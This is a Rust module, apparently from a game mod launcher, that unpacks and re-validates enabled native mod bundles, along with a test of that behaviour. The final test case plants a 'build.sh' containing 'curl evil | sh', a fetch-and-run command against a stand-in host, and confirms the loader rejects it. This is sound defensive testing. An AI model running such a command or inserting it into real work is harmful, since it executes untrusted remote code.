use crate::native_cache::Dirs;
use std::fs;
use std::path::{Path, PathBuf};

/// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
/// off in `eclipse-mods.txt` like any mod.
pub const INSTALLED: &str = "eclipse-native-mods";

/// Installed `.hnmod`s unpacked for one build, or for the warning before it: a folder of its own,
/// so another build or warning can't change it, removed when this is dropped.
pub struct Unpacked(PathBuf);

impl Unpacked {
    pub fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for Unpacked {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

/// The `.hnmod`s in game folder `home` ([`INSTALLED`]), on or off, in name order.
pub(crate) fn installed_files(home: &Path) -> Vec<PathBuf> {
    let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
        .map(|dir| dir.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
    paths.sort();
    paths
}

/// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
/// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
/// `mixins/<id>/`, plus files under its `data/`, nothing run).
pub fn installed_mods(home: &Path) -> Result<Unpacked, String> {
    static CALLS: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
    let n = CALLS.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let out = Unpacked(
        Dirs::current()
            .installed_incoming()
            .join(format!("{}-{n}", std::process::id())),
    );
    let _ = fs::remove_dir_all(out.path());
    let mut count = 0;
    for path in installed_files(home) {
        let bundle = eclipse_mods::index::native::Bundle::read(&path)
            .map_err(|e| format!("{}: {e}", path.display()))?;
        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
            continue;
        }
        let dir = out.path().join(&bundle.manifest.id);
        for (name, bytes) in &bundle.files {
            let to = dir.join(name);
            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
        }
        count += 1;
    }
    if count == 0 {
        return Err(format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        ));
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::super::key::{source_digest, version_for};
    use super::super::manifest::{bundles, repin, NATIVE_MANIFEST};
    use super::super::target::Target;
    use super::super::Profile;
    use super::*;
    use crate::native_mods::tests::{dir, write_native, A, B};
    use std::io::Write;

    #[test]
    fn installed_mods_are_the_checked_files_of_those_turned_on() {
        let d = dir("installed-src");
        write_native(&d, "veinminer", A, B);
        let home = dir("installed-home");
        fs::create_dir_all(home.join(INSTALLED)).unwrap();
        let pack = |name: &str, extra: Option<(&str, &str)>| {
            let mut zip =
                zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
            let options = zip::write::SimpleFileOptions::default();
            for file in [NATIVE_MANIFEST, "mixins/veinminer/eclipse-mixin.toml"] {
                zip.start_file(file, options).unwrap();
                zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
            }
            if let Some((file, body)) = extra {
                zip.start_file(file, options).unwrap();
                zip.write_all(body.as_bytes()).unwrap();
            }
            zip.finish().unwrap();
        };
        pack("veinminer.hnmod", None);
        assert!(installed_mods(&home).is_err(), "off until turned on");
        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
        let out = installed_mods(&home).unwrap();
        let mut found = bundles(out.path()).unwrap();
        assert_eq!(
            (found[0].id.as_str(), found[0].eclipse.as_deref()),
            ("veinminer", Some(A))
        );
        // What a build records of it is what the Mods page compares: up to date, not Needs rebuild.
        assert_eq!(
            crate::native_status::enabled(&home),
            [(
                "veinminer".to_string(),
                "0.3.0".to_string(),
                source_digest(&found[0])
            )]
        );
        repin(&mut found[0], "f".repeat(40).as_str()).unwrap();
        assert_ne!(
            crate::native_status::enabled(&home)[0].2,
            source_digest(&found[0]),
            "a build reads the digest before repinning its copy"
        );
        pack(
            "veinminer.hnmod",
            Some(("mixins/veinminer/data/table.bin", "data")),
        );
        let out = installed_mods(&home).unwrap();
        let path = out.path().join("veinminer/mixins/veinminer/data/table.bin");
        assert_eq!(fs::read(&path).unwrap(), b"data");
        let first = version_for(
            A,
            B,
            Profile::Performance,
            Target::Client,
            None,
            &bundles(out.path()).unwrap(),
        )
        .unwrap();
        fs::write(path, b"changed").unwrap();
        assert_ne!(
            first,
            version_for(
                A,
                B,
                Profile::Performance,
                Target::Client,
                None,
                &bundles(out.path()).unwrap()
            )
            .unwrap()
        );
        pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
    }
}
